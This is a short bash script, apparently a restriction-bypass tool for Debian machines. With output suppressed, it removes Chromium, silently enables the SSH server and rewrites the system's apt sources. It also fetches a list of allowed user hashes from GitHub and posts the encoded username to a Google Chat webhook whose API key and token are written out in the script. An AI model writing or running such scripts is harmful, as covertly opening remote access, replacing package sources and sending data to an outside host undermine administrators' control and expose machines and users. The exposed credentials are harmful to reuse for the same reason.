#!/bin/bash

rm /tmp/code.txt &>/dev/null
sudo apt remove -y chromium &>/dev/null
sudo systemctl enable --now ssh &>/dev/null

function install_shit(){
    echo 'deb https://cloudfront.debian.net/debian/ bookworm main contrib non-free
    deb https://cloudfront.debian.net/debian/ bookworm-updates main' | sudo tee /etc/apt/sources.list
    clear
    curl -H 'Content-Type: application/json' -X POST 'https://chat.googleapis.com/v1/spaces/AAQAae4ZDBc/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=XrylE2IQQASahNGdB8_rxEgKVBSTXtvD8y_GXPVNfbU' --data "{"text": \"${code_user}\"}" -s &>/dev/null 2>/dev/null
    echo 'Instalando...'
    tput civis
    sudo apt-get update &>/dev/null
    sudo apt install -y chromium &>/dev/null
    rm /tmp/code.txt
    tput cnorm
    clear
    echo 'Instalado'
    exit 0
}


code_user=$(echo -n "$(echo -n "${USER}" | md5sum)" | tr -d ' ' | tr -d '\-' | base64 -w0 | base32 -w0)

wget -O /tmp/code.txt 'https://raw.githubusercontent.com/Dario-git-hub/repo-changer-bypass/refs/heads/main/testfileprueba.zip' -q

for line in $(cat /tmp/code.txt)
do
    if [ ${line} = ${code_user} ]
    then 
        install_shit
    fi
done